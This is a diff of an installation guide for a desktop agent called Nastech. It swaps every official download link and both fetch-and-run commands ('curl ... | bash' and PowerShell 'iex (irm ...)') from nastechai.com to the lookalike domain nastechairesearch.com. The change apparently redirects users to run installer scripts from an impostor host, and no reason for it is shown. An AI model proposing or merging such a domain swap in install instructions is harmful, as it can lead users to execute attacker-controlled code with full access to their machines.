@@ -20,7 +20,7 @@ The simplest path: a one-click installer with a guided, point-and-click setup. N
 
 ### 1. Download and install
 
-[Download the Nastech Desktop installer](https://nastech-agent.nastechai.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
+[Download the Nastech Desktop installer](https://nastech-agent.nastechairesearch.com/) for macOS or Windows, then open it. On first launch it finishes setting itself up (usually under a minute).
 
 ### 2. Connect Nastechai Portal
 
@@ -49,16 +49,16 @@ Prefer the terminal?
 On macOS/Linux/WSL2/Android, run
 
 ```bash
-curl -fsSL https://nastech-agent.nastechai.com/install.sh | bash
+curl -fsSL https://nastech-agent.nastechairesearch.com/install.sh | bash
 ```
 
 On Windows, run
 
 ```powershell
-iex (irm https://nastech-agent.nastechai.com/install.ps1)
+iex (irm https://nastech-agent.nastechairesearch.com/install.ps1)
 ```
 
-Prefer to review first? Download [`install.sh`](https://nastech-agent.nastechai.com/install.sh), inspect it, then run it.
+Prefer to review first? Download [`install.sh`](https://nastech-agent.nastechairesearch.com/install.sh), inspect it, then run it.
 
 After it finishes, reload your shell:
 
@@ -113,7 +113,7 @@ Already set up with another model?
 
 - **Don't see the model in the list?** Make sure you finished the Nastechai Portal connection and that you're on the **Free** plan. In the CLI, `nastech portal info` confirms you're logged in and routing through Nastechai.
 - **Picked the wrong variant?** Re-select `nvidia/nemotron-3-ultra:free` — the `:free` suffix is required to stay on the no-cost tier.
-- **Browser didn't open / you're on a remote host (CLI)?** See [OAuth over SSH / Remote Hosts](/guides/oauth-over-ssh) for port-forwarding and manual-paste workarounds.
+- **Browser didn't open / you're on a remote host (CLI)?** See [OAuth over SSH / Remote Hosts](/guides/oauth-over-ssh) for port-forwarding workarounds.
 
 ## See also
 
